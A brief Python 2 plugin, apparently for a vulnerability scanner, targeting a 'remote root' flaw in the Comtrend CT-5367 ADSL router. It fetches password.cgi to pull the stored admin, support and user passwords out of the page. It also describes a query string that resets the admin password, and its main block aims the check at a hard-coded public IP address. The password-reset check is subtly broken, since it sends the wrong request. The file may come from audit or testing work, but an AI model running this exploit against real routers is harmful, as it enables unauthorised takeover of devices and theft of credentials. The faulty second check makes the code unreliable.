#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: Comtrend ADSL Router CT-5367 C01_R12 - Remote Root
refer: https://www.exploit-db.com/exploits/16275/
refer: http://www.exploit-db.com/exploits/18101/
description:
    访问 http://foobar/password.cgi 管理员密码包含在返回结果中
    访问 http://foobar/password.cgi?sysPassword=rootpass&sptPassword=supportpass重置管理员密码
'''

import re
import urlparse


def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'password.cgi'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200:
        m = re.search(r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
        if m:
            security_hole('find administrator password on telnet: ' + m.group(0));

    payload_change_pass = 'password.cgi?sysPassword=testvul'
    code, head, res, err, _  = curl.curl2(payload)
    if code == 200 and "pwdAdmin = 'testvul'" in res:
        security_hole('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass')

if __name__ == '__main__':
    from dummy import *
    audit(assign('www','http://213.91.224.17/')[1])